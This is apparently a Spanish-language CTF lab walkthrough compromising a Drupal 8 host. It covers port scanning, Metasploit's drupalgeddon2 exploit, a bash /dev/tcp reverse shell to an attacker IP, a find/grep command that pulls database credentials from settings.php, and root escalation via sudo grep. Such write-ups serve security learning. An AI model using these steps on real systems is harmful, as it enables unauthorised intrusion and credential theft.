
![](img/Pasted%20image%2020241215212428.png#center)

Esta máquina es una explotación a un creador de contenidos CMS llamado Drupal.


---

## Reconocimiento inicial


Empezaremos realizando un ping a la máquina para verificar su correcto funcionamiento, al hacerlo vemos que tiene un TTL de 64, lo que significa que la máquina objetivo usa un sistema operativo Linux.
```
ping -c 1 172.17.0.2
```
![](img/Pasted%20image%2020241225213402.png#center)

---

## **Enumeración**


#### Escaneo de puertos

Realizamos un escaneo de puertos básico con **nmap** para identificar los puertos que están abiertos:
```
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
```
![](img/Pasted%20image%2020241225213135.png#center)


**Resultados del escaneo:**

| Puerto  | Estado | Servicio     |
| ------- | ------ | ------------ |
| 80/tcp  | open   | http         |

Realizamos un segundo escaneo al puerto abierto, lanzando una serie de script por defecto de `nmap` y reconocimiento de servicios.
```
nmap -p80 -sVC --min-rate 5000 -n -Pn 172.17.0.2
```
![](img/Pasted%20image%2020241225213259.png#center)


| Puerto | Estado | Servicio | Versión                      |
| ------ | ------ | -------- | ---------------------------- |
| 80/tcp | open   | http     | Apache httpd 2.4.52 (Ubuntu) |

**Puertos y servicios abiertos:**
- **Puerto 80/tcp (HTTP):** Indica que el sistema está ejecutando un servidor web Apache versión 2.4.25 en un sistema operativo Ubuntu. Este puerto se utiliza para servir páginas web. Pero en uno de los script lanzados de nmap, nos indica que es un *DRUPAL 8*.
![](img/Pasted%20image%2020241225213505.png#center)



---


<h3><center> Análisis del servidor web HTTP (puerto 80)</center></h3>

Al introducir en la `URL`, la dirección IP, confirmamos que tenemos ante nosotros un *DRUPAL* y también vemos que tiene un panel de `login`.
![](img/Pasted%20image%2020241225213616.png)

#### `Login`
![](img/Pasted%20image%2020241225213738.png)



### Fuzzing WEB
Podemos probar si tenemos alguna ruta, directorio o fichero que nos pueda ser de utilidad.
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html,asp
```
![](img/Pasted%20image%2020241225214219.png#center)



Vemos que nos saca algunas rutas pero ninguna interesantes. Vamos a realizar lo mismo pero con la herramienta `DIRB`
```
dirb http://172.17.0.2
```
![](img/Pasted%20image%2020241225214523.png#center)

No creo que vaya por aquí, tenemos la ruta `admin`, que es interesante pero nos lo da con un código de error de `403`, el cual nos indica que no tenemos acceso.


Vamos a utilizar la herramienta `METASPLOIT`, para ver si podemos encontrar algún explotit para este *Drupal 8*

---

## Explotación


### Metasploit


Iniciamos el metasploit
```
msfconsole init -q
```
![](img/Pasted%20image%2020241225214824.png#center)




Buscamos algún módulo para esta versión de *Drupal*
```
search drupal 8
```
![](img/Pasted%20image%2020241225214921.png#center)






Seleccionamos el exploit que nos interese, en este caso vamos a usar el primero
```
use 0 
#ó
use exploit/unix/webapp/drupal_drupalgeddon2 
```
![](img/Pasted%20image%2020241225215014.png#center)




Vemos las opciones
```
show options
```
![](img/Pasted%20image%2020241225215050.png)
Si funciona el exploit y entra en la máquina nos dará un `meterpreter`.



Modificamos las opciones que necesitemos
```
set RHOST 172.17.0.2
```
![](img/Pasted%20image%2020241225215226.png#center)


Ejecutamos el exploit
```
exploit
```
![](img/Pasted%20image%2020241225222022.png#center)


Ya tenemos un `meterpreter`

---

## Post-Explotación

Para tener un mejor manejo de la terminal, vamos a enviarnos una `reverse shell` a nuestra máquina. El código para enviarnos la `reverse shell`, podemos encontrarlo en la web [ReverseShell][https://www.revshells.com/]
![](img/Pasted%20image%2020241225222310.png)


Pero antes de ejecutar el comandos que nos enviará una `reverse shell`, nos ponemos en nuestra máquina KALI a la escucha con `netcat`, por el puerto que especificamos.
```
nc -nlvp 1234
```

![](img/Pasted%20image%2020241225222440.png#center)


En la sesión de `meterpreter` que obtuvimos con la explotación de la máquina vamos a cambiarnos a una `shell` y iniciamos con una `bash`
```
shell
/bin/bash -i
```

![](img/Pasted%20image%2020241225222748.png#center)


Teniendo una consola de comandos, ejecutamos el comando que nos dará la `reverse shell`
```
bash -i >& /dev/tcp/192.168.1.31/1234 0>&1
```

![](img/Pasted%20image%2020241225222825.png#center)


Si vamos a nuestro KALI, en la terminal donde estábamos a la escucha, deberemos a ver recibido la `reverse shell`

![](img/Pasted%20image%2020241225223002.png#center)


## TTY

Hacemos el tratamiento de la TTY para obtener una consola de comandos funcional
```
script /dev/null -c bash
```

![](img/Pasted%20image%2020241225223110.png#center)

Presionamos **CTRL+Z** para suspender la shell
```
www-data@host_/$ ^Z
zsh: suspended nc -nlvp 4444
```


 Ahora resetearemos la configuración de la shell que dejamos en segundo plano indicando **reset** y **xterm**
 ```
~$> stty raw -echo; fg

[1]  + continued  nc -nlvp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm
```


Exportamos las variables de entorno **TERM** y **SHELL**
```
www-data@host:/$ export TERM=xterm
www-data@host:/$ export SHELL=bash
```

![](img/Pasted%20image%2020241225223357.png#center)

Cambiamos el tamaño de la *tty*, si vemos el tamaño que tiene la máquina vicitma
```
stty size
```

![](img/Pasted%20image%2020241225223510.png#center)

SI la comparamos con mi máquina atacante
```
stty size
```

![](img/Pasted%20image%2020241225223540.png#center)


Vemos que hay una diferencia, lo que hacemos es modificar en la máquina victima y configurar el tamaño de la *tty*, como la que tenemos en nuestra máquina atacante.
```
stty rows 45 columns 208
```

![](img/Pasted%20image%2020241225223659.png#center)


## Enumeración Máquina Victima

Empezamos a revisar todos los archivos, no veo nada interesante, pero buscando por internet en la web de [HackTricks][find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null], encuentro un comando para leer el fichero `settings.php`, que suele estar en un *Drupal*
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```

![](img/Pasted%20image%2020241225224105.png#center)

Gracias a leer el fichero `settings.php`, encontramos un usuario llamado `ballenita` y su contraseña `ballenitafeliz`.

Credeciales

| Usuario   | Contraseña     |
| --------- | -------------- |
| ballenita | ballenitafeliz |


Intentamos entrar con ese usuario
```
su ballenita
```

![](img/Pasted%20image%2020241225224633.png#center)

Somos el usuario `ballenita`

---

## Escalada de Privilegios



Comenzamos listando los posibles binarios que el usuario `ballenita`, puede ejecutar como usuario `root`
```
sudo -l
```

![](img/Pasted%20image%2020241225224805.png#center)




Podemos observar que el usuario `ballenita`, puede ejecutar los comandos `ls` y `grep`, como si fuera el usuario `root`, esto me da la idea de que podemos enumerar todos los ficheros que contiene la carpeta `root`
```
sudo  /bin/ls -la /root
```

![](img/Pasted%20image%2020241225225048.png#center)

Encontramos un ficheros llamado `secretitomaximo.txt` que se encuentra en la carpeta `root`.  Si vamos a la web de [GTFObins][https://gtfobins.github.io/gtfobins/grep/#sudo] y buscamos `grep`, nos indica lo siguiente

![](img/Pasted%20image%2020241225225249.png#center)


Ejecutando el comando `sudo grep '' /Fichero_a_leer`, podemos leer cualquier fichero siendo `root`, y como en la carpeta `root`, encontramos un fichero interesante para leer. Con este comando podemos ver lo que contiene el fichero `secretitomaximo.txt`.
```
sudo grep '' /root/secretitomaximo.txt
```

![](img/Pasted%20image%2020241225225457.png#center)

Vemos una posible contraseña, que lo mas probable es que sea del usuario `root`, así que intentamos cambiarnos al usuario `root`.
```
su root     # Después ponemos la contaseña "nobodycanfindthispasswordrootrocks"
```

![](img/Pasted%20image%2020241225225721.png#center)

Somos el usuario `root`.